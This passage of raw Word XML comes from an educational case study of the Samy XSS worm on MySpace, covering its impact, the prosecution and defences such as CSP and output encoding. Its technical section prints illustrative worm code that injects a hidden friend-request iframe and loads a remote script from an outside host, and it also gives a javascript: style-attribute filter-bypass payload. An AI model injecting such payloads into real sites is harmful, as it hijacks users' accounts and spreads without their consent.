          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">Once a user viewed a profile containing the worm, the JavaScript code </w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>automatically added Samy as a friend and copied the worm to their own profile. This created a self-replicating worm that spread exponentially across MySpace.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>What Was the Payload?</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>The payload was a JavaScript snippet that added Samy Kamkar as a friend and displayed the phrase "but most of all, Samy is my hero" on the infected user's profile. It then replicated itself to spread further.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Impact on </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MySpace</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>Within 24 hours, over one million MySpace profiles were infected. MySpace was forced to shut down temporarily to resolve the issue.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidR="00EE27D7">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>gal Actions Taken</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Samy</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Kamkar</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> was investigated by the U.S. Secret Service and charged under the Computer Fraud and Abuse Act (CFAA). He was banned from using the internet for several years as part of his sentence.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61A26C8C" w14:textId="4324A590" w:rsidR="006C6472" w:rsidRPr="007F392E" w:rsidRDefault="00A66412" w:rsidP="00E65022">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>Technical Analysis</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="791C0625" w14:textId="77777777" w:rsidR="00E65022" w:rsidRPr="00E65022" w:rsidRDefault="00E65022" w:rsidP="00E65022">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B6FEE78" w14:textId="77777777" w:rsidR="007F392E" w:rsidRDefault="00A66412">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Code Used in the Samy Worm (Simplified):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04A1B1D7" w14:textId="18BD2A9A" w:rsidR="007F392E" w:rsidRDefault="00A66412">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&lt;script type="text/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>javascript</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>document.body</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.innerHTML</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> += '&lt;iframe src="http://www.myspace.com/index.cfm?fuseaction=invite.addfriend_confirm&amp;friendID=123456" style="</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>display:none</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>;"&gt;&lt;/iframe&gt;';</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>document.body.innerHTML</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> += '&lt;script </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>src</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>="http://samy.pl/worm.js"&gt;&lt;/script&gt;';</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C180AEC" w14:textId="77777777" w:rsidR="00EE27D7" w:rsidRPr="007F392E" w:rsidRDefault="00EE27D7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11E554F8" w14:textId="0C1B6C3F" w:rsidR="006C6472" w:rsidRPr="00EE27D7" w:rsidRDefault="00A66412">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>This code:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>- Automatically sent a friend request to Samy.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>- Loaded the worm from an external source.</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>- Injected itself into the profile of every infected user.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CDF2119" w14:textId="77777777" w:rsidR="007F392E" w:rsidRPr="00E65022" w:rsidRDefault="007F392E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25F95F19" w14:textId="1E61EC1F" w:rsidR="006C6472" w:rsidRDefault="00A66412">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">How </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MySpace’s</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Filters Failed</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MySpace</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> had filters in place to block tags like &lt;script&gt;, but Samy was able to bypass them using alternate encodings and non-script HTML attributes that executed JavaScript.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DAC3243" w14:textId="77777777" w:rsidR="00EE27D7" w:rsidRPr="00EE27D7" w:rsidRDefault="00EE27D7">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B107F04" w14:textId="77777777" w:rsidR="007F392E" w:rsidRPr="00E65022" w:rsidRDefault="007F392E">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E012E81" w14:textId="77777777" w:rsidR="00EE27D7" w:rsidRDefault="00A66412">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Bypassing Sanitization</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AC213FA" w14:textId="4A698ADD" w:rsidR="006C6472" w:rsidRPr="00EE27D7" w:rsidRDefault="00A66412">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>For example, instead of using &lt;script&gt;, Samy used malformed tags and encoded characters to trick the filter:</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>&lt;div style="background:url('</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>javascript:alert</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>(1)')"&gt;Click&lt;/div&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00E65022">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>This was not detected and executed the code upon rendering.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32854C1E" w14:textId="635B93F3" w:rsidR="006C6472" w:rsidRPr="007F392E" w:rsidRDefault="00A66412" w:rsidP="007F392E">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>Security Lessons Learned</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4933CD66" w14:textId="77777777" w:rsidR="007F392E" w:rsidRPr="007F392E" w:rsidRDefault="007F392E" w:rsidP="007F392E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EC5DCC3" w14:textId="3C416E11" w:rsidR="006C6472" w:rsidRPr="007F392E" w:rsidRDefault="00A66412">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>How Platforms Should Prevent XSS</w:t>
      </w:r>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>- Input should always be sanitized and validated.</w:t>
      </w:r>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>- Output should be encoded before rendering.</w:t>
      </w:r>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>- Scripts should be disallowed from untrusted user input.</w:t>
      </w:r>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>Modern Protections</w:t>
      </w:r>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>- Content Security Policy (CSP): Restricts what content can be loaded and executed.</w:t>
      </w:r>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>- Contextual Output Encoding: Properly encode HTML, JavaScript, and URL contexts.</w:t>
      </w:r>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>- HTTPOnly and Secure Cookies: Prevent access to cookies via scripts.</w:t>
      </w:r>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>- Framework-based Templates: Use secure frameworks that handle escaping automatically (e.g., React, Angular).</w:t>
      </w:r>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>These mechanisms significantly reduce the chances of an XSS attack.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47B2F1B7" w14:textId="61B41EFB" w:rsidR="006C6472" w:rsidRDefault="00A66412" w:rsidP="007F392E">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
        </w:rPr>
        <w:t>Conclusion</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57C2A801" w14:textId="77777777" w:rsidR="007F392E" w:rsidRPr="007F392E" w:rsidRDefault="007F392E" w:rsidP="007F392E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36EFE142" w14:textId="77777777" w:rsidR="006C6472" w:rsidRPr="007F392E" w:rsidRDefault="00A66412">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>The Samy Worm incident on MySpace remains a powerful case study in the impact of XSS vulnerabilities. It demonstrated how simple JavaScript, when unchecked, can result in large-scale breaches, affecting millions of users. This attack underscores the need for robust input sanitization, output encoding, and modern web application security practices.</w:t>
      </w:r>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br/>
        <w:t>With evolving threats, it is crucial that developers adopt a security-first mindset, leverage modern protections like CSP, and follow secure coding standards. Understanding past attacks like the Samy Worm helps developers and organizations design systems that are more resilient and secure in today’s digital age.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BA16A68" w14:textId="0C8E0318" w:rsidR="006C6472" w:rsidRDefault="00A66412" w:rsidP="007F392E">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007F392E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>References</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42A69AD0" w14:textId="77777777" w:rsidR="007F392E" w:rsidRPr="007F392E" w:rsidRDefault="007F392E" w:rsidP="007F392E">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:rPr>
          <w:sz w:val="24"/>
